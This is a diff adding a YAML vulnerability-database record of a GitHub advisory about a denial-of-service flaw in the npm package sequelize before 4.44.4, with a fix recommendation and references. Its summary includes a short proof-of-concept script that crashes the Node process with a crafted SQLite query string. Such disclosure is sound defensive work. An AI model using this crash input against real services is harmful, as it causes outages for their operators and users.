@@ -1,0 +1,33 @@
+advisory_id: GHSA-fw4p-36j9-rrj3
+datasource_id: github_osv_importer_v2/GHSA-fw4p-36j9-rrj3
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-fw4p-36j9-rrj3/GHSA-fw4p-36j9-rrj3.json
+aliases: []
+summary: "Denial of Service in sequelize\nVersions of `sequelize` prior to 4.44.4 are vulnerable\
+  \ to Denial of Service (DoS). The SQLite dialect fails to catch a `TypeError` exception for\
+  \ the `results` variable. The `results` value may be undefined and trigger the error on a\
+  \ `.map` call. This may allow attackers to submit malicious input that forces the exception\
+  \ and crashes the Node process.  \n\nThe following proof-of-concept crashes the Node process:\
+  \  \n```\nconst Sequelize = require('sequelize');\n\nconst sequelize = new Sequelize({\n\t\
+  dialect: 'sqlite',\n\tstorage: 'database.sqlite'\n});\n\nconst TypeError = sequelize.define('TypeError',\
+  \ {\n\tname: Sequelize.STRING,\n});\n\nTypeError.sync({force: true}).then(() => {\n\treturn\
+  \ TypeError.create({name: \"SELECT tbl_name FROM sqlite_master\"});\n});\n```\n\n\n## Recommendation\n\
+  \nUpgrade to version 4.44.4 or later."
+impacted_packages:
+  - purl: pkg:npm/sequelize
+    affected_versions: vers:npm/<4.44.4
+    fixed_versions: vers:npm/4.44.4
+severities:
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-248
+references:
+  - url: https://github.com/sequelize/sequelize/pull/11877
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/1142
+    reference_type:
+    reference_id:
